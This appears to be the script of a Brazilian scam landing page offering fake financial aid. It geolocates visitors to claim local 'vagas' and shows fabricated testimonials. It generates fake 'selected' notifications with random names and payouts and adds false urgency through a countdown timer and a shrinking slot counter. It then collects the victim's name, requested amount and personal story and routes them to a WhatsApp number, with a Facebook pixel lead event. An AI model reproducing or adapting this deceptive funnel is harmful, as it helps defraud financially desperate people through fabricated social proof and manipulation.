<script>
    let local = "Brasil";
    fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(d => {
            local = d.city;
            document.getElementById('geo-text').innerText = `⚠️ 6 vagas de auxílio liberadas para ${d.city}/${d.region_code}`;
            initNotifs();
        });

    const homens = ["Ricardo S.", "Marcos O.", "Felipe M.", "Tiago G.", "Paulo B.", "Lucas V.", "André L.", "João P.", "Gustavo H.", "Bruno C."];
    const mulheres = ["Sandra R.", "Lúcia M.", "Fabiana L.", "Beatriz V.", "Elena P.", "Amanda K.", "Carla F.", "Juliana T.", "Renata M.", "Fernanda S."];
    const fotosH = [1, 3, 7, 11, 12, 13, 14, 15, 18, 59];
    const fotosM = [2, 5, 6, 9, 10, 16, 20, 22, 26, 32];

    const depoimentos = [
        {n:'Ricardo S.', g:'h', v:'R$ 5.000', t:'Paguei o agiota que me ameaçava.', i:'https://i.pravatar.cc/150?u=11'},
        {n:'Marcos Uber', g:'h', v:'R$ 10.000', t:'Consertei o carro pra voltar a rodar.', i:'https://i.pravatar.cc/150?u=13'},
        {n:'Sandra R.', g:'m', v:'R$ 3.500', t:'Paguei os remédios da minha mãe.', i:'https://i.pravatar.cc/150?u=10'},
        {n:'Lúcia M.', g:'m', v:'R$ 2.800', t:'Quitei minha luz e aluguel.', i:'https://i.pravatar.cc/150?u=16'}
    ];

    const track = document.getElementById('track');
    depoimentos.forEach(d => {
        track.innerHTML += `<div class="slide"><div class="slide-inner"><div class="u-meta"><img src="${d.i}" class="u-img"><div class="u-name"><b>${d.n}</b><span>Sua Região</span></div><div class="u-val">${d.v}</div></div><p class="u-txt">"${d.t}"</p></div></div>`;
    });

    let slide = 0;
    setInterval(() => { slide = (slide + 1) % depoimentos.length; track.style.transform = `translateX(-${slide * 100}%)`; }, 4500);

    function initNotifs() {
        const stack = document.getElementById('notif-stack');
        function show() {
            const isHomem = Math.random() > 0.5;
            const nome = isHomem ? homens[Math.floor(Math.random()*homens.length)] : mulheres[Math.floor(Math.random()*mulheres.length)];
            const fotoId = isHomem ? fotosH[Math.floor(Math.random()*fotosH.length)] : fotosM[Math.floor(Math.random()*fotosM.length)];
            const valor = "R$ " + (Math.floor(Math.random() * (12000 - 1500) + 1500)).toLocaleString('pt-BR');
            
            const el = document.createElement('div');
            el.className = 'notif-ios';
            el.innerHTML = `<img src="https://i.pravatar.cc/150?img=${fotoId}"><div class="n-info"><b>${nome} foi selecionado(a)!</b><span>Recebeu <i>${valor}</i> em <span class="city-bold">${local}</span></span></div>`;
            stack.appendChild(el);
            setTimeout(() => el.classList.add('show'), 100);
            setTimeout(() => { el.classList.remove('show'); setTimeout(()=>el.remove(), 800); }, 5000);
        }
        setInterval(show, 8000);
        setTimeout(show, 1500);
    }

    function showModal() { document.getElementById('modal').style.display = 'flex'; }
    function go(n) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('s'+n).classList.add('active');
    }
    function startAnalysis() {
        go('_loading');
        setTimeout(() => { document.getElementById('l_b').style.width = "100%"; }, 100);
        setTimeout(() => { go(3); startTimer(300, document.getElementById('timer')); }, 3200);
    }
    function startTimer(duration, display) {
        let timer = duration, m, s;
        setInterval(() => {
            m = parseInt(timer / 60, 10); s = parseInt(timer % 60, 10);
            display.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
            if (--timer < 0) timer = 0;
        }, 1000);
    }

    function finish() {
        // 🔥 EVENTO ADICIONADO AQUI
        if (typeof fbq === 'function') {
            fbq('track', 'Lead');
        }

        const n = document.getElementById('in_nome').value;
        const v = document.getElementById('in_valor').value;
        const h = document.getElementById('in_historia').value;
        const msg = `Olá Monaia, fui uma das 6 pessoas selecionadas para a ajuda de hoje! 🙏\n\n📌 *DADOS DO MEU PERFIL:*\n👤 *Nome:* ${n}\n💰 *Valor solicitado:* R$ ${v}\n\n📝 *MINHA HISTÓRIA:*\n"${h}"\n\noq devo fazer pra receber minha ajuda agora?`;
        window.location.href = `https://api.whatsapp.com/send?phone=5581995850167&text=${encodeURIComponent(msg)}`;
    }

    let vc = 6;
    setInterval(() => { if(vc > 1) { vc--; document.getElementById('v-count').innerText = vc; } }, 45000);
</script>
